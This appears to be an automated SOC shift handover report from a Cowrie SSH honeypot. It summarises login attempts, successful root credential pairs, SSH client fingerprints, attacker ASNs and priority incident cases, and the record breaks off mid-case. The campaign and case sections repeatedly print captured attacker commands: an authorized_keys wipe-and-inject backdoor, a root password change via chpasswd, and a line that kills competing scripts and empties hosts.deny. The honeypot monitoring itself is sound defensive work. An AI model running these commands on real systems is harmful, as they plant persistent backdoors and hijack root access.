# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-08 |
| **Generated At** | 2026-06-08T15:59:47Z |
| **Shift Time** | 15:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **805** |
| Confirmed Threats | **740** |
| False Positives Filtered | **65** (8.1%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **21** |
| High Severity Cases | **164** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **641** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **485** |
| Unique Credential Pairs | **217** |
| Unique Usernames | **119** |
| Unique Passwords | **174** |
| Successful Auth Pairs | **107** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 166 |
| `345gs5662d34` | 77 |
| `ubuntu` | 23 |
| `dev` | 15 |
| `test` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 77 |
| `3245gs5662d34` | 76 |
| `123456` | 34 |
| `1234` | 9 |
| `password` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 77 |
| `root` | `3245gs5662d34` | 76 |
| `usr` | `usr123` | 3 |
| `cyber` | `cyber` | 3 |
| `odoo` | `odoo@2022` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `TrustNo1` | `14.225.217.138` | 2026-06-08T11:03:30 |
| `root` | `3245gs5662d34` | `14.225.217.138` | 2026-06-08T11:03:33 |
| `root` | `haslo123` | `14.29.235.187` | 2026-06-08T11:05:40 |
| `root` | `root1111` | `14.29.235.187` | 2026-06-08T11:06:28 |
| `root` | `3245gs5662d34` | `14.29.235.187` | 2026-06-08T11:06:41 |
| `root` | `123456.com` | `106.51.92.114` | 2026-06-08T11:07:16 |
| `root` | `3245gs5662d34` | `106.51.92.114` | 2026-06-08T11:07:18 |
| `root` | `@qwer2025` | `14.29.235.187` | 2026-06-08T11:08:19 |
| `root` | `abcdefgh` | `14.29.235.187` | 2026-06-08T11:14:42 |
| `root` | `admin` | `59.27.249.238` | 2026-06-08T11:26:32 |
| `root` | `qaz123` | `89.47.53.19` | 2026-06-08T11:34:26 |
| `root` | `Gr123456@` | `220.154.133.120` | 2026-06-08T11:34:27 |
| `root` | `3245gs5662d34` | `89.47.53.19` | 2026-06-08T11:34:30 |
| `root` | `qwer@12345` | `47.237.155.51` | 2026-06-08T11:35:35 |
| `root` | `3245gs5662d34` | `47.237.155.51` | 2026-06-08T11:35:37 |
| `root` | `aa123456!!` | `144.79.133.50` | 2026-06-08T11:48:07 |
| `root` | `3245gs5662d34` | `144.79.133.50` | 2026-06-08T11:48:09 |
| `root` | `Hj123456..` | `144.79.133.50` | 2026-06-08T12:04:26 |
| `root` | `qwer@12345` | `144.79.133.50` | 2026-06-08T12:15:03 |
| `root` | `admin@@` | `144.79.133.50` | 2026-06-08T12:19:12 |
| `root` | `Rootroot123` | `144.79.133.50` | 2026-06-08T12:21:12 |
| `root` | `12qwaszX` | `144.79.133.50` | 2026-06-08T12:25:20 |
| `root` | `2wsx!QAZ` | `144.79.133.50` | 2026-06-08T12:27:47 |
| `root` | `qaz123` | `144.79.133.50` | 2026-06-08T12:30:09 |
| `root` | `Huawei12` | `101.126.54.66` | 2026-06-08T12:35:03 |
| `root` | `qwer123456!` | `101.126.54.66` | 2026-06-08T12:39:22 |
| `root` | `3245gs5662d34` | `101.126.54.66` | 2026-06-08T12:39:29 |
| `root` | `Qqq123456` | `101.126.54.66` | 2026-06-08T12:40:43 |
| `root` | `free` | `68.183.212.68` | 2026-06-08T12:42:50 |
| `root` | `3245gs5662d34` | `68.183.212.68` | 2026-06-08T12:42:54 |
| `root` | `infinity@123` | `35.188.112.111` | 2026-06-08T12:46:59 |
| `root` | `3245gs5662d34` | `35.188.112.111` | 2026-06-08T12:47:05 |
| `root` | `w123456w` | `68.183.212.68` | 2026-06-08T12:47:53 |
| `root` | `1234rfv` | `35.188.112.111` | 2026-06-08T12:48:37 |
| `root` | `Ct123456` | `68.183.212.68` | 2026-06-08T12:51:20 |
| `root` | `Ty123456` | `101.126.54.66` | 2026-06-08T12:51:30 |
| `root` | `free` | `35.188.112.111` | 2026-06-08T12:53:34 |
| `root` | `Welcome@12345` | `68.183.212.68` | 2026-06-08T12:54:35 |
| `root` | `server2016` | `35.188.112.111` | 2026-06-08T12:55:12 |
| `root` | `infinity@123` | `68.183.212.68` | 2026-06-08T12:56:17 |
| `root` | `201201` | `179.176.210.17` | 2026-06-08T12:56:40 |
| `root` | `3245gs5662d34` | `179.176.210.17` | 2026-06-08T12:56:48 |
| `root` | `1234rfv` | `68.183.212.68` | 2026-06-08T12:59:44 |
| `root` | `Qaz@12345` | `68.183.212.68` | 2026-06-08T13:01:28 |
| `root` | `gwh28dgcmp` | `34.123.134.194` | 2026-06-08T13:02:33 |
| `root` | `3245gs5662d34` | `34.123.134.194` | 2026-06-08T13:02:39 |
| `root` | `201201` | `68.183.212.68` | 2026-06-08T13:03:14 |
| `root` | `123!@#QWEqwe` | `179.176.210.17` | 2026-06-08T13:03:25 |
| `root` | `w123456w` | `35.188.112.111` | 2026-06-08T13:03:55 |
| `root` | `qazwsx` | `34.123.134.194` | 2026-06-08T13:04:31 |
| `root` | `Qaz@12345` | `179.176.210.17` | 2026-06-08T13:09:58 |
| `root` | `Qaz@12345` | `35.188.112.111` | 2026-06-08T13:10:38 |
| `root` | `gwh28dgcmp` | `161.248.189.72` | 2026-06-08T13:11:42 |
| `root` | `3245gs5662d34` | `161.248.189.72` | 2026-06-08T13:11:44 |
| `root` | `Welcome@12345` | `35.188.112.111` | 2026-06-08T13:12:19 |
| `root` | `123!@#QWEqwe` | `68.183.212.68` | 2026-06-08T13:13:01 |
| `root` | `@root1234` | `42.51.32.228` | 2026-06-08T13:13:57 |
| `root` | `3245gs5662d34` | `42.51.32.228` | 2026-06-08T13:14:00 |
| `root` | `ahead` | `34.123.134.194` | 2026-06-08T13:14:20 |
| `root` | `201201` | `35.188.112.111` | 2026-06-08T13:15:52 |
| `root` | `server2016` | `68.183.212.68` | 2026-06-08T13:16:30 |
| `root` | `qwer1234567` | `161.248.189.72` | 2026-06-08T13:17:49 |
| `root` | `Za123456` | `161.248.189.72` | 2026-06-08T13:19:51 |
| `root` | `123!@#QWEqwe` | `35.188.112.111` | 2026-06-08T13:20:50 |
| `root` | `w123456w` | `179.176.210.17` | 2026-06-08T13:21:28 |
| `root` | `q1w2e3r4t5y6u7` | `161.248.189.72` | 2026-06-08T13:23:50 |
| `root` | `Welcome@12345` | `179.176.210.17` | 2026-06-08T13:24:49 |
| `root` | `@root1234` | `161.248.189.72` | 2026-06-08T13:25:48 |
| `root` | `Qwer1234!` | `34.123.134.194` | 2026-06-08T13:26:00 |
| `root` | `qazwsx` | `161.248.189.72` | 2026-06-08T13:27:53 |
| `root` | `Ct123456` | `35.188.112.111` | 2026-06-08T13:29:25 |
| `root` | `ahead` | `161.248.189.72` | 2026-06-08T13:30:02 |
| `root` | `Root2026!@` | `34.123.134.194` | 2026-06-08T13:30:11 |
| `root` | `leo` | `161.248.189.72` | 2026-06-08T13:32:06 |
| `root` | `server2016` | `179.176.210.17` | 2026-06-08T13:32:10 |
| `root` | ` ` | `190.119.63.81` | 2026-06-08T13:32:22 |
| `root` | `Kp123456` | `161.248.189.72` | 2026-06-08T13:34:12 |
| `root` | `qwer1234567` | `34.123.134.194` | 2026-06-08T13:34:13 |
| `root` | `q1w2e3r4t5y6u7` | `34.123.134.194` | 2026-06-08T13:38:09 |
| `root` | `Ct123456` | `179.176.210.17` | 2026-06-08T13:39:12 |
| `root` | `Za123456` | `34.123.134.194` | 2026-06-08T13:40:13 |
| `root` | `Kp123456` | `34.123.134.194` | 2026-06-08T13:42:21 |
| `root` | `Adminroot` | `34.123.134.194` | 2026-06-08T13:44:26 |
| `root` | `Adminroot` | `161.248.189.72` | 2026-06-08T13:47:19 |
| `root` | `@root1234` | `34.123.134.194` | 2026-06-08T13:48:41 |
| `root` | `free` | `179.176.210.17` | 2026-06-08T13:49:32 |
| `root` | `Root2026!@` | `161.248.189.72` | 2026-06-08T13:49:32 |
| `root` | `leo` | `34.123.134.194` | 2026-06-08T13:52:33 |
| `root` | `Qwer1234!` | `161.248.189.72` | 2026-06-08T13:53:35 |
| `root` | `1234rfv` | `179.176.210.17` | 2026-06-08T13:59:57 |
| `root` | `Abcd.2026` | `50.84.211.204` | 2026-06-08T14:12:45 |
| `root` | `3245gs5662d34` | `50.84.211.204` | 2026-06-08T14:12:50 |
| `root` | `bigred` | `103.187.146.107` | 2026-06-08T14:16:07 |
| `root` | `3245gs5662d34` | `103.187.146.107` | 2026-06-08T14:16:09 |
| `root` | `!qaz@WSX` | `8.217.193.233` | 2026-06-08T14:22:53 |
| `root` | `Abc123456!@#` | `45.129.242.233` | 2026-06-08T14:24:28 |
| `root` | `3245gs5662d34` | `45.129.242.233` | 2026-06-08T14:24:31 |
| `root` | `infinity@123` | `179.176.210.17` | 2026-06-08T14:27:14 |
| `root` | `qq12345.` | `103.154.158.70` | 2026-06-08T15:06:33 |
| `root` | `3245gs5662d34` | `103.154.158.70` | 2026-06-08T15:06:35 |
| `root` | `dell.123` | `107.197.183.81` | 2026-06-08T15:10:33 |
| `root` | `3245gs5662d34` | `107.197.183.81` | 2026-06-08T15:10:39 |
| `root` | `P@ssw0rd1!` | `37.46.18.151` | 2026-06-08T15:31:25 |
| `root` | `3245gs5662d34` | `37.46.18.151` | 2026-06-08T15:31:29 |
| `root` | `len` | `106.75.227.248` | 2026-06-08T15:42:52 |
| `root` | `password` | `115.190.158.15` | 2026-06-08T15:52:13 |
| `root` | `1qaz2wsx+` | `106.75.227.248` | 2026-06-08T15:55:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **805** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 538 |
| Go SSH scanner | 11 |
| Unknown | 3 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 426 | 28 |
| `03a80b21afa8...` | Modern SSH client | 74 | 6 |
| `af8223ac9914...` | libssh-based | 9 | 1 |
| `0a07365cc01f...` | Generic scanner | 5 | 1 |
| `2f5ebb184f5d...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 426 | 28 | Mirai/variant |
| `03a80b21afa8...` | libssh | 74 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 28 | 10 | — |
| `af8223ac9914...` | libssh | 9 | 1 | libssh-based |
| `0a07365cc01f...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `2f5ebb184f5d...` | Unknown | 3 | 1 | Modern SSH client |
| `4e066189c3bb...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 76 | 19 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pfDNUjSPeV6c"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.75.227.248`, `220.154.133.120`, `14.29.235.187`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `47.237.155.51`, `161.248.189.72`, `50.84.211.204`, `101.126.54.66`, `37.46.18.151`, `42.51.32.228`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **47** |
| High-Risk ASNs | **41** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (161)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-611279050828

| Field | Detail |
|---|---|
| **Source IP** | `14.225.217[.]138` |
| **First Seen** | 2026-06-08 11:03 |
| **Last Seen** | 2026-06-08 11:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:03:29` | `cowrie.session.connect` |
| `2026-06-08 11:03:29` | `cowrie.client.version` |
| `2026-06-08 11:03:29` | `cowrie.client.kex` |
| `2026-06-08 11:03:30` | `cowrie.login.success` |
| `2026-06-08 11:03:30` | `cowrie.session.params` |
| `2026-06-08 11:03:30` | `cowrie.command.input` |
| `2026-06-08 11:03:30` | `cowrie.command.failed` |
| `2026-06-08 11:03:30` | `cowrie.log.closed` |
| `2026-06-08 11:03:30` | `cowrie.session.params` |
| `2026-06-08 11:03:30` | `cowrie.command.input` |
| `2026-06-08 11:03:30` | `cowrie.session.file_download` |
| `2026-06-08 11:03:30` | `cowrie.log.closed` |
| `2026-06-08 11:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.217[.]138` to AbuseIPDB if not already reported
- [ ] Block `14.225.217[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4fc57b7927b

| Field | Detail |
|---|---|
| **Source IP** | `14.225.217[.]138` |
| **First Seen** | 2026-06-08 11:03 |
| **Last Seen** | 2026-06-08 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:03:32` | `cowrie.session.connect` |
| `2026-06-08 11:03:32` | `cowrie.client.version` |
| `2026-06-08 11:03:32` | `cowrie.client.kex` |
| `2026-06-08 11:03:33` | `cowrie.login.success` |
| `2026-06-08 11:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.217[.]138` to AbuseIPDB if not already reported
- [ ] Block `14.225.217[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8129c244f343

| Field | Detail |
|---|---|
| **Source IP** | `14.29.235[.]187` |
| **First Seen** | 2026-06-08 11:05 |
| **Last Seen** | 2026-06-08 11:06 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pfDNUjSPeV6c"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:05:38` | `cowrie.session.connect` |
| `2026-06-08 11:05:39` | `cowrie.client.version` |
| `2026-06-08 11:05:39` | `cowrie.client.kex` |
| `2026-06-08 11:05:40` | `cowrie.login.success` |
| `2026-06-08 11:05:41` | `cowrie.session.params` |
| `2026-06-08 11:05:41` | `cowrie.command.input` |
| `2026-06-08 11:05:41` | `cowrie.command.failed` |
| `2026-06-08 11:05:42` | `cowrie.log.closed` |
| `2026-06-08 11:05:42` | `cowrie.session.params` |
| `2026-06-08 11:05:42` | `cowrie.command.input` |
| `2026-06-08 11:05:42` | `cowrie.session.file_download` |
| `2026-06-08 11:05:42` | `cowrie.log.closed` |
| `2026-06-08 11:05:55` | `cowrie.session.params` |
| `2026-06-08 11:05:55` | `cowrie.command.input` |
| `2026-06-08 11:05:56` | `cowrie.log.closed` |
| `2026-06-08 11:05:56` | `cowrie.session.params` |
| `2026-06-08 11:05:56` | `cowrie.command.input` |
| `2026-06-08 11:05:57` | `cowrie.log.closed` |
| `2026-06-08 11:05:57` | `cowrie.session.params` |
| `2026-06-08 11:05:57` | `cowrie.command.input` |
| `2026-06-08 11:05:57` | `cowrie.session.file_download` |
| `2026-06-08 11:05:57` | `cowrie.log.closed` |
| `2026-06-08 11:05:58` | `cowrie.session.params` |
| `2026-06-08 11:05:58` | `cowrie.command.input` |
| `2026-06-08 11:05:58` | `cowrie.log.closed` |
| `2026-06-08 11:06:01` | `cowrie.session.params` |
| `2026-06-08 11:06:01` | `cowrie.command.input` |
| `2026-06-08 11:06:01` | `cowrie.log.closed` |
| `2026-06-08 11:06:02` | `cowrie.session.params` |
| `2026-06-08 11:06:02` | `cowrie.command.input` |
| `2026-06-08 11:06:02` | `cowrie.command.input` |
| `2026-06-08 11:06:02` | `cowrie.log.closed` |
| `2026-06-08 11:06:03` | `cowrie.session.params` |
| `2026-06-08 11:06:03` | `cowrie.command.input` |
| `2026-06-08 11:06:03` | `cowrie.log.closed` |
| `2026-06-08 11:06:04` | `cowrie.session.params` |
| `2026-06-08 11:06:04` | `cowrie.command.input` |
| `2026-06-08 11:06:04` | `cowrie.log.closed` |
| `2026-06-08 11:06:05` | `cowrie.session.params` |
| `2026-06-08 11:06:05` | `cowrie.command.input` |
| `2026-06-08 11:06:05` | `cowrie.log.closed` |
| `2026-06-08 11:06:06` | `cowrie.session.params` |
| `2026-06-08 11:06:06` | `cowrie.command.input` |
| `2026-06-08 11:06:06` | `cowrie.log.closed` |
| `2026-06-08 11:06:07` | `cowrie.session.params` |
| `2026-06-08 11:06:07` | `cowrie.command.input` |
| `2026-06-08 11:06:07` | `cowrie.log.closed` |
| `2026-06-08 11:06:08` | `cowrie.session.params` |
| `2026-06-08 11:06:08` | `cowrie.command.input` |
| `2026-06-08 11:06:08` | `cowrie.log.closed` |
| `2026-06-08 11:06:09` | `cowrie.session.params` |
| `2026-06-08 11:06:09` | `cowrie.command.input` |
| `2026-06-08 11:06:09` | `cowrie.log.closed` |
| `2026-06-08 11:06:09` | `cowrie.session.params` |
| `2026-06-08 11:06:09` | `cowrie.command.input` |
| `2026-06-08 11:06:10` | `cowrie.log.closed` |
| `2026-06-08 11:06:10` | `cowrie.session.params` |
| `2026-06-08 11:06:10` | `cowrie.command.input` |
| `2026-06-08 11:06:11` | `cowrie.log.closed` |
| `2026-06-08 11:06:11` | `cowrie.session.params` |
| `2026-06-08 11:06:11` | `cowrie.command.input` |
| `2026-06-08 11:06:11` | `cowrie.log.closed` |
| `2026-06-08 11:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.235[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.29.235[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-248d408603e0

| Field | Detail |
|---|---|
| **Source IP** | `14.29.235[.]187` |
| **First Seen** | 2026-06-08 11:06 |
| **Last Seen** | 2026-06-08 11:06 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:06:24` | `cowrie.session.connect` |
| `2026-06-08 11:06:27` | `cowrie.client.version` |
| `2026-06-08 11:06:27` | `cowrie.client.kex` |
| `2026-06-08 11:06:28` | `cowrie.login.success` |
| `2026-06-08 11:06:29` | `cowrie.session.params` |
| `2026-06-08 11:06:29` | `cowrie.command.input` |
| `2026-06-08 11:06:29` | `cowrie.command.failed` |
| `2026-06-08 11:06:29` | `cowrie.log.closed` |
| `2026-06-08 11:06:30` | `cowrie.session.params` |
| `2026-06-08 11:06:30` | `cowrie.command.input` |
| `2026-06-08 11:06:30` | `cowrie.session.file_download` |
| `2026-06-08 11:06:30` | `cowrie.log.closed` |
| `2026-06-08 11:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.235[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.29.235[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18694e304dc9

| Field | Detail |
|---|---|
| **Source IP** | `14.29.235[.]187` |
| **First Seen** | 2026-06-08 11:06 |
| **Last Seen** | 2026-06-08 11:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:06:37` | `cowrie.session.connect` |
| `2026-06-08 11:06:40` | `cowrie.client.version` |
| `2026-06-08 11:06:40` | `cowrie.client.kex` |
| `2026-06-08 11:06:41` | `cowrie.login.success` |
| `2026-06-08 11:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.235[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.29.235[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0a250ca71d

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 11:07 |
| **Last Seen** | 2026-06-08 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
